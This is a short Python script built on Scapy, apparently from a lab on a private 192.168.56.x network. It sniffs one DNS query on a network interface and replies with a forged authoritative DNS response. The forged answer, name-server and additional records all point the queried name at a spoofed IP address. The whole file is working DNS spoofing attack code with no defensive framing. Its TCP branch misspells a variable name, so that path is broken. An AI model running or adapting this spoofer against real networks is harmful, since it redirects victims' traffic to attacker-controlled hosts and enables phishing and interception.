from scapy.all import *

macAttacker = "08:00:27:d0:25:4b"            
ipAttacker = "192.168.56.103"

interface = "enp0s8"


def send_dns_request():
    dns_req = IP(dst='8.8.8.8')/ UDP(dport=53)/ DNS(rd=1, qd=DNSQR(qname='www.google.com'))
    answer = sr1(dns_req, verbose=0)

    print(answer[DNS].summary())

def port_listener():  
    print(' Sniffing... ')
    DNSPacket = sniff(iface=interface, filter="port 53", count=1)
    
   # print('DNS packet: ' + DNSPacket[0].show())
    
    clientSrcIP = DNSPacket[0].getlayer(IP).src

    if DNSPacket[0].haslayer(UDP):
        clientSrcPort = DNSPacket[0].getlayer(UDP).sport
        print('UDP')
    elif DNSPacket[0].haslayer(TCP) :
        clientSrcPort = DNSPacket[0].getlayer(TCP).sport
        print('TCP')

    clientDNSQueryID = DNSPacket[0].getlayer(DNS).id

    clientDNSQueryDataCount = DNSPacket[0].getlayer(DNS).qdcount

    clientDNSServer = DNSPacket[0].getlayer(IP).dst

    clientDNSQuery = DNSPacket[0].getlayer(DNS).qd.qname

    print('Received Src Ip: {}, \n Received Src Port: {} \n Received Query ID {} \n Query Data Count: {} \n Current DNS server: {} \n DNS Query: {} '.format(clientSrcIP, clientSrcPort, clientDNSQueryID, clientDNSQueryDataCount, clientDNSServer, clientDNSQuery) )

    spoofedDNSServerIP = '192.168.56.102'
    spoofedIPPkt = IP(src=spoofedDNSServerIP,dst=clientSrcIP)

    if DNSPacket[0].haslayer(UDP) : 
        spoofedUDP_TCPPacket = UDP(sport=53,dport=clientSrcPort)
    elif DNSPacket[0].haslayer(TCP) : 
        spoofedUDP_TCPPPacket = UDP(sport=53,dport=clientSrcPort)

    spoofedDNSPacket = DNS(id=clientDNSQueryID,qr=1,opcode=DNSPacket[0].getlayer(DNS).opcode,aa=1,rd=0,ra=0,z=0,rcode=0,qdcount=clientDNSQueryDataCount,ancount=1,nscount=1,arcount=1,qd=DNSQR(qname=clientDNSQuery,qtype=DNSPacket[0].getlayer(DNS).qd.qtype,qclass=DNSPacket[0].getlayer(DNS).qd.qclass),an=DNSRR(rrname=clientDNSQuery,rdata=spoofedDNSServerIP,ttl=86400),ns=DNSRR(rrname=clientDNSQuery,type=2,ttl=86400,rdata=spoofedDNSServerIP),ar=DNSRR(rrname=clientDNSQuery,rdata=spoofedDNSServerIP))
    
    print(spoofedDNSPacket[0].show())
    sendp(Ether()/spoofedIPPkt/spoofedUDP_TCPPacket/spoofedDNSPacket,iface=interface, count=1)

port_listener()

    
